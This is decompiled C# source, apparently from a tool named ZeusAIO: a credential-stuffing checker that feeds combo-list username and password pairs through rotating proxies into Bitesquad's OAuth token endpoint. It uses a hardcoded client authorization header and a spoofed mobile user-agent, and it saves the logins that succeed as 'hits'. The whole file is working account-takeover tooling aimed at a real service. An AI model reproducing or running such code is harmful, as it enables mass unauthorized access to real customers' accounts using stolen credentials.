// Decompiled with JetBrains decompiler
// Type: Bitesquad.Check
// Assembly: ZeusAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 70786947-2129-410F-AE9A-C082629DAC36
// Assembly location: C:\Users\ofekt\Desktop\סורס\ZeusAIO.exe

using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using ZeusAIO;

namespace Bitesquad
{
  internal class Check
  {
    public static int threads = 0;
    public static string proxyprotocol = "";
    public static List<string> combos;
    public static List<string> proxies1;
    public static int proxytotal = 0;
    public static int combototal = 0;
    public static int free = 0;
    public static int comboindex = 0;
    public static int cpm = 0;
    public static int cpm_aux = 0;
    public static int check = 0;
    public static int error = 0;
    public static int hit = 0;
    public static int bad = 0;
    public static int h;
    public static int m;
    public static int s;

    public static bool CheckAccount(string[] s, string proxy)
    {
      for (int index = 0; index < Config.config.Retries + 1; ++index)
      {
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              proxy = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
              if (mainmenu.proxyProtocol == "HTTP")
                httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS4")
                httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS5")
                httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
              httpRequest.IgnoreProtocolErrors = true;
              httpRequest.AllowAutoRedirect = true;
              httpRequest.AddHeader("User-Agent", "okhttp/3.8.1");
              httpRequest.AddHeader("Authorization", "Basic Ml8zbnpiY2prN3p4dXNrdzA4OG9vMG9rd284NDQ0Y3c4MDhrbzhzb3NrMDhvc2c0OG9vZzpvOTllNTh6aHJkd3djMDBzY2t3NGs0OG9rczAwNDBzazA4Y3cwd3NvZ29jNHMwNGM0");
              httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
              string str1 = "username=" + s[0] + "&password=" + s[1] + "&grant_type=password&device_id=d9c8ad68-0453-4e56-94db-06fb95bfc5b8";
              string str2 = httpRequest.Post("https://www.bitesquad.com/oauth/v2/token", str1, "application/x-www-form-urlencoded").ToString();
              if (!str2.Contains("{\"message\":\"Invalid email/password combination\"}") && !str2.Contains("Invalid email/password combination") && !str2.Contains("Invalid email/password"))
              {
                if (str2.Contains("access_token"))
                {
                  ++mainmenu.hits;
                  if (mainmenu.p1 == "2")
                    Colorful.Console.WriteLine("[HIT - BITESQUAD] " + s[0] + ":" + s[1], Color.Green);
                  Export.AsResult("/Bitesquad_hits", s[0] + ":" + s[1]);
                  return false;
                }
                break;
              }
              break;
            }
          }
          catch (Exception ex)
          {
            ++mainmenu.errors;
          }
        }
      }
      return false;
    }

    public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
  }
}
